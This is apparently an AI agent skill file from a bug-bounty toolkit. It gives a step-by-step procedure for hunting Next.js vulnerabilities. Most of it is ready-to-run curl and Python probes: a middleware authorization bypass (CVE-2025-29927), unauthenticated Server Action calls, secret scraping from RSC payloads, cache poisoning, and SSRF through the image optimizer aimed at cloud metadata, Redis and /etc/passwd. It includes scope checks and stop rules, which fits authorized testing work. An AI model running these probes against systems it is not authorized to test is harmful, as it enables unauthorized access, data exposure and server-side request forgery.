---
name: zp-nextjs
description: ZeroProtocol hunter for Next.js and React server-framework footguns - middleware authorization bypass via x-middleware-subrequest, Server Actions invoked directly by action id, RSC flight payloads carrying server-only data, /_next/data and route-handler authz gaps, the /_next/image optimizer as an SSRF, NEXT_PUBLIC_ and __NEXT_DATA__ leakage, ISR cache poisoning and router open redirect. Use when a target serves /_next/ assets, a buildId, a Next-Action header or text/x-component responses.
---

# zp-nextjs - the framework did the authorization

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

Next.js puts the trust boundary in places nobody thinks of as endpoints - a middleware matcher, a
hashed action id, a flight stream, an image proxy. Every finding here is one sentence: **the app's
authorization lives somewhere the request does not have to go through.** The bar is a request reaching
protected data or a protected mutation with no valid session, reproduced twice, witnessed by the
framework's own response.

---

## Procedure

**1. Fingerprint the framework, the router generation and the build.** Half the probes below are
version-gated; the wrong ones waste the program's rate limit.

```bash
H=target.tld
curl -skI "https://$H/" | grep -iE 'x-powered-by|x-nextjs|x-vercel|^server:'
B=$(curl -sk "https://$H/" | grep -oE '"buildId":"[^"]+"' | head -1 | cut -d'"' -f4); echo "buildId=$B"
curl -sk "https://$H/" | grep -oE '__NEXT_DATA__|self\.__next_f|/_next/static/chunks/[^"]+\.js' | sort -u
curl -sk "https://$H/_next/static/$B/_buildManifest.js" | grep -oE '"/[^"]*"' | tr -d '"' | sort -u | head -60
```

| Signal | Reading |
|---|---|
| `X-Powered-By: Next.js` | default `poweredByHeader` - confirmation, no version |
| `<script id="__NEXT_DATA__">` | **Pages Router** - `/_next/data/<buildId>/…json` exists |
| `self.__next_f.push(`, `chunks/main-app-*.js` | **App Router** (13.4+) - flight, Server Actions, `?_rsc=` |
| `x-nextjs-cache`, `x-nextjs-prerender`, `x-nextjs-stale-time` | ISR or PPR in play - go to step 6 |
| `x-vercel-id`, `server: Vercel` | Vercel edge in front; platform mitigations apply (kill table) |

There is **no version header**. Infer and label it inferred - React 18 in the bundles implies 13/14,
React 19 implies 15/16; a `200` on `<chunk>.js.map` means `productionBrowserSourceMaps` is on and the
original TypeScript names every Server Action. Behaviour pins the version, never a string.

**2. Middleware bypass - `x-middleware-subrequest` (CVE-2025-29927).** Next skipped middleware
entirely for a request claiming to be an internal subrequest. Fixed in 12.3.5 / 13.5.9 / 14.2.25 /
15.2.3. Baseline against a route that **redirects** when unauthenticated, or the result is unreadable.

```bash
R=/admin; echo "baseline=$(curl -sk -o /dev/null -w '%{http_code}' "https://$H$R")"
for v in "middleware:middleware:middleware:middleware:middleware" "middleware" "src/middleware" \
         "pages/_middleware" "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"; do
  printf '%-64s ' "$v"
  curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' "https://$H$R" -H "x-middleware-subrequest: $v"
done
```

`307 -> /login` becoming `200` with the protected body is the finding. The repeated form matches 15.x
(recursion depth 5), the bare-path form 12.x-14.x, where the value must equal the middleware module
path. **Diff the bodies** - plenty of apps render an empty shell at 200.

**3. Matcher and path-space bypass.** Middleware runs only on the paths its `matcher` selects; the data
routes are a different path space sharing the page's loader.

```bash
for p in "$R" "$R/" "$R/." "//$R" "/_next/data/$B$R.json" "/_next/data/$B$R/index.json" \
         "%5Fnext/data/$B$R.json" "$R?__nextDataReq=1"; do
  printf '%-52s ' "$p"; curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' "https://$H/${p#/}"
done
curl -sk -D - "https://$H$R?_rsc=zp1" -H 'RSC: 1' | head -c 400
```

**4. Server Actions.** An action is a POST to *any* rendered route carrying a `Next-Action` header
with the action's hash. Authorization must sit inside the action body; many apps only hide the button.

```bash
for c in $(curl -sk "https://$H/" | grep -oE '/_next/static/chunks/[^"]+\.js' | sort -u); do
  curl -sk "https://$H$c" | grep -oaE 'createServerReference[^"]{0,40}"[0-9a-f]{40,64}"|\$ACTION_ID_[0-9a-f]{40,64}'
done | sort -u
curl -sk -D - -X POST "https://$H/dashboard" \
  -H "Next-Action: $ACTION" -H 'Content-Type: text/plain;charset=UTF-8' --data-raw '[]' | head -c 600
```

Read the response class, not the status. A flight stream (`text/x-component`, lines opening `0:`,
`1:`) means it **ran**. `Failed to find Server Action` means the id is not in that route's manifest -
retry on the route it was declared for. Read-only-looking actions first; step 8 is the stop point.

**5. RSC and `__NEXT_DATA__` leakage.** Everything a Server Component hands a Client Component ships in the payload the browser receives, rendered or not.

```bash
curl -sk "https://$H/dashboard" -H "Cookie: session=$TOK_A" | python3 - <<'PY'
import sys,re,json
b=sys.stdin.read(); m=re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>',b,re.S)
if m: print(json.dumps(json.loads(m.group(1)).get('props',{}),indent=1)[:3000])
print('\n'.join(re.findall(r'self\.__next_f\.push\(\[1,"(.{0,600}?)"\]\)',b))[:3000])
PY
curl -sk "https://$H/dashboard?_rsc=zp1" -H 'RSC: 1' -H "Cookie: session=$TOK_A" \
  | grep -aoiE '(secret|token|apikey|password|internal|sk_live|salary)[^,"]{0,60}' | sort -u
```

**6. ISR and flight cache poisoning.** Unique buster on every probe so no real visitor is served your response - `zp-cache-poison` owns that discipline; this is the Next-specific keying bug.

```bash
CB="zpcb$RANDOM"
curl -skI "https://$H/blog/post?$CB=1" -H 'RSC: 1' | grep -iE 'x-nextjs-cache|x-vercel-cache|age|content-type|vary'
curl -skI "https://$H/blog/post?$CB=1"                | grep -iE 'x-nextjs-cache|content-type'
```

A plain second request answering `text/x-component` because the first primed the key is the App
Router RSC cache-poisoning shape (CVE-2025-49005, 15.3.0-15.3.2). Same method for an unkeyed
`Next-Url` or `X-Forwarded-Host`.

**7. Image optimizer, redirects, dev endpoints.**

```bash
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
for u in "http://169.254.169.254/latest/meta-data/" "http://127.0.0.1:6379/" "file:///etc/passwd" \
         "https://zp$RANDOM.canary.example/x.png"; do
  printf '%-46s ' "$u"
  curl -sk -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' "https://$H/_next/image?url=$(enc "$u")&w=64&q=75"
done
curl -sk -o /dev/null -D - "https://$H/login?next=//zp.canary.example" | grep -i '^location:'
curl -sk -o /dev/null -w '%{http_code}\n' "https://$H/__nextjs_original-stack-frame?isServer=true"
```

`new URL(searchParams.get("next"), request.url)` inside middleware turns `//host` into an absolute
off-site redirect - the most common Next open redirect. `zp-open-redirect` takes it from there.

**8. Stop point - state it in the report.** You stop at the first response proving the boundary is gone
- the protected body at `200`, a flight stream from an action you had no right to call, a hit on your
own canary, a leaked field. You do **not** invoke mutating or deleting Server Actions, poison a
production cache key, walk `/_next/data/` across real user ids, use a credential the optimizer
returned, or run the payload half of a public RSC RCE exploit.

---

## Probes and payloads

| Probe | Breaks | Positive looks like |
|---|---|---|
| `x-middleware-subrequest: middleware:…x5` | CVE-2025-29927 on 15.x | baseline 307 becomes 200 with the gated body |
| `x-middleware-subrequest: src/middleware` | same on 12.x-14.x (module-path form) | as above |
| `/_next/data/<buildId>/<route>.json` | a `matcher` listing page paths only | `pageProps` for a page you cannot load |
| `RSC: 1` on a gated route | authz in the page, not the layout or handler | `text/x-component` flight with the real data |
| `Next-Action: <hash>` + `[]`, no cookie | action with no in-body authz check | flight `0:`/`1:` lines, or a mutated record |
| `$ACTION_ID_<hash>` as a multipart field | the no-JS progressive-enhancement path | action runs with no header at all |
| `/_next/image?url=<unique canary>` | `remotePatterns`/`domains` wildcards | DNS or HTTP hit on **your** canary host |
| `/_next/image?url=http://169.254.169.254/…` | optimizer with no allow-list | never read the status - see kill table |
| `RSC: 1` then plain GET, unique buster | `Accept`/`RSC` outside the cache key | plain fetch returns `text/x-component` |
| `?next=//canary`, `?callbackUrl=https://canary` | middleware `new URL(v, req.url)`, NextAuth | `Location` whose **authority** is your host |
| `__nextjs_original-stack-frame`, `__nextjs_launch-editor` | `next dev` left running in production | anything that is **not** 404 |
| `/api/revalidate?secret=…&path=/` | revalidate handler with a weak or missing secret | `{"revalidated":true}` with no auth |

Every probe is `curl` plus `python3` stdlib. `nuclei -tags nextjs` at the program's rate limit makes leads, never findings - reproduce each by hand.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| gated route returns `200` **and the protected body** with the subrequest header, no cookie | **confirmed auth bypass.** High/Critical by what is behind it |
| same header yields `200` with an empty shell, skeleton or the login page | **killed.** Middleware was skipped, the page still renders nothing |
| it works off-platform but the target sits on Vercel | the edge strips the header; a `307` does **not** prove the app is patched. Report both |
| Server Action ran unauthenticated and returned other data or changed state | **confirmed broken function-level authz.** High |
| action answered `Failed to find Server Action`, or redirected to login | killed for that id - wrong route, or the action checks its caller |
| `/_next/data/…json` returns what the page denies you | **confirmed.** Same bug as the page, a path space middleware missed |
| `NEXT_PUBLIC_*` value meant to be public (analytics, Supabase anon, publishable Stripe) | **killed.** Ask what it authorizes, not whether it exists |
| `NEXT_PUBLIC_` name wrapping a server credential (service-role JWT, `sk_live`, SMTP password) | confirmed exposure - validate liveness per `zp-js-secrets`, never use it |
| `/_next/image` returns `400` for your URL | the **normal allow-list rejection**, not a filter you beat. Killed |
| `/_next/image` returns `200` with an optimized image | still not SSRF - the body is a re-encoded image, not the upstream response |
| your unique canary host logged a DNS or HTTP request from the optimizer | **confirmed SSRF.** `zp-ssrf` for reach and impact |
| flight served on a plain re-fetch of a **busted** key with `x-nextjs-cache: HIT` | confirmed poisoning as a busted-key PoC; describe the production key in words |
| marker reflected, no cache `HIT`, no second-client fetch | reflection, not poisoning. Killed |
| `__nextjs_*` dev endpoints 404 | expected on every production build. Killed - not a filter to bypass |
| version inferred in a vulnerable range, no behavioural probe | **unconfirmed.** Back-ports are normal; `zp-cve`'s rule applies here |

---

## High-value patterns

- **A `matcher` enumerating page paths** while `/_next/data/`, route handlers and `?_rsc=` reach the same loaders - the most productive shape in this class.
- **Authorization in `layout.tsx` only** - layouts are skipped on RSC-only navigations; the page data still ships.
- **Server Actions on admin surfaces** (`deleteUser`, `impersonate`, `exportInvoices`, `approve`) - the id is public, the authz is the rendered button.
- **A Server Component passing a whole session, user or config object as a prop** to a client component that renders one field.
- **`images.domains: ["*"]`** or a wildcard `remotePatterns` hostname - a fetcher whose allow-list allows everything.
- **NextAuth `callbackUrl` and middleware `new URL(param, req.url)`** - open redirect into OAuth code theft, which is the report that pays.

---

## Pitfalls

- **Claiming the middleware bypass from a status code.** A `200` holding the login shell is not access.
- **Reporting `/_next/image` SSRF on a `400`, or on an image body.** Out-of-band callback or nothing.
- **Firing a mutating Server Action to see what it does.** Read-only first, your own objects only.
- **Poisoning a real cache key.** Unique buster on every probe, every time.
- **Reporting `NEXT_PUBLIC_` variables as secrets** without asking what they authorize - the most common junk report against a Next.js target.
- **Looping `/_next/data/<id>.json` over real user ids.** Two accounts you own is the method.
- **Running a public RSC RCE exploit at a live target.** Detection half only, then `zp-cve`.

---

## Hand off to

Optimizer and fetcher callbacks -> `zp-ssrf`. Action and data-route authz -> `zp-authz`, `zp-idor`.
Route handler inventory -> `zp-api`; GraphQL behind one -> `zp-graphql`. Bundles, maps and
`NEXT_PUBLIC_` values -> `zp-js-secrets`; recovered source -> `zp-code-audit`. Busted-key PoCs ->
`zp-cache-poison`. `next=`/`callbackUrl=` -> `zp-open-redirect`, then `zp-jwt-oauth` for code theft.
`dangerouslySetInnerHTML` sinks -> `zp-xss`, witnessed by `zp-browser`. Route-handler object merges ->
`zp-proto-pollution`. Version-range CVEs -> `zp-cve`. Unfound routes -> `zp-content-discovery`. Leaky
errors and manifests -> `zp-info-disclosure`. Confirmed and deduped -> `zp-triage`, then `zp-report`.
